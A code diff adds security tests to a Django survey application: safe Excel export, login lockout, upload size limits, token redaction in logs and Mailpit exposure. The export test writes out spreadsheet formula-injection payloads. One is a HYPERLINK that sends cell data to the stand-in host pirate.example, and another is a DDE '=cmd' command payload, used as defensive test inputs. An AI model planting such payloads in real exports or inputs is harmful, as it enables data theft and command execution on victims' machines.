@@ -364,3 +364,57 @@ class LienPublicTests(Base):
     def test_page_et_config(self):
         self.assertIn(self.client.get("/formulaire").status_code, (200, 503))
         self.assertEqual(self.client.get(reverse("api:config")).json()["lien_public"], "http://testserver/formulaire")
+
+
+@override_settings(EMAIL_BACKEND="django.core.mail.backends.locmem.EmailBackend")
+class SecuriteTests(Base):
+    def test_export_excel_sans_injection_de_formules(self):
+        from enquete import export_excel
+        r = self.nouvelle_reponse()
+        r.nom = '=HYPERLINK("http://pirate.example/?d="&A2,"Cliquez")'
+        r.donnees = {"C01": '=cmd|"/C calc"!A0', "H02": "@SUM(1,1)", "A07": "-2+3"}
+        r.statut, r.date_soumission = Reponse.Statut.SOUMIS, timezone.now()
+        r.save()
+        ws = load_workbook(BytesIO(export_excel.classeur(self.campagne, [r])))["Réponses"]
+        entetes = [c.value for c in ws[1]]
+        for col in ("Nom du répondant", "C01", "H02", "A07"):
+            cellule = ws.cell(row=2, column=entetes.index(col) + 1)
+            self.assertEqual(cellule.data_type, "s", col)  # texte, jamais formule
+        self.assertEqual(ws.cell(row=2, column=entetes.index("C01") + 1).value, '=cmd|"/C calc"!A0')  # contenu conservé
+
+    def test_blocage_apres_echecs_de_connexion_api_et_django_admin(self):
+        for i in range(5):
+            self.assertEqual(self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": f"faux{i}"}).status_code, 401)
+        resp = self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": "motdepasse-solide"})
+        self.assertEqual(resp.status_code, 429)  # même le bon mot de passe est refusé pendant le blocage
+        self.assertIn("15 minutes", resp.json()["erreur"])
+        resp = self.client.post("/django-admin/login/", {"username": "admin", "password": "motdepasse-solide"})
+        self.assertNotEqual(resp.status_code, 302)  # /django-admin/ est protégé de la même façon
+
+    def test_succes_efface_les_echecs(self):
+        for i in range(4):
+            self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": f"faux{i}"})
+        self.assertEqual(self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": "motdepasse-solide"}).status_code, 200)
+        from enquete.models import EchecConnexion
+        self.assertFalse(EchecConnexion.objects.filter(identifiant="admin").exists())
+
+    def test_requete_trop_volumineuse_refusee_avant_lecture(self):
+        r = self.nouvelle_reponse()
+        resp = self.client.post(reverse("api:piece_publique", args=[r.jeton, "J01"]), data=b"x",
+                                content_type="application/octet-stream", CONTENT_LENGTH=str(50 * 1024 * 1024))
+        self.assertEqual(resp.status_code, 413)
+
+    def test_journaux_sans_jetons(self):
+        import logging
+        from enquete.journaux import FiltreJetons
+        enreg = logging.LogRecord("django.request", logging.WARNING, __file__, 1, "%s: %s",
+                                  ("Not Found", "/api/r/JETONSECRET123/modules/A/"), None)
+        FiltreJetons().filter(enreg)
+        self.assertEqual(enreg.getMessage(), "Not Found: /api/r/***/modules/A/")
+
+    def test_mailpit_reserve_au_poste_et_au_profil_dev(self):
+        from pathlib import Path
+        compose = (Path(__file__).resolve().parents[2] / "docker-compose.yml").read_text(encoding="utf-8")
+        bloc = compose[compose.index("  mailpit:"):compose.index("  backup:")]
+        self.assertIn('profiles: ["dev"]', bloc)
+        self.assertIn('"127.0.0.1:8025:8025"', bloc)
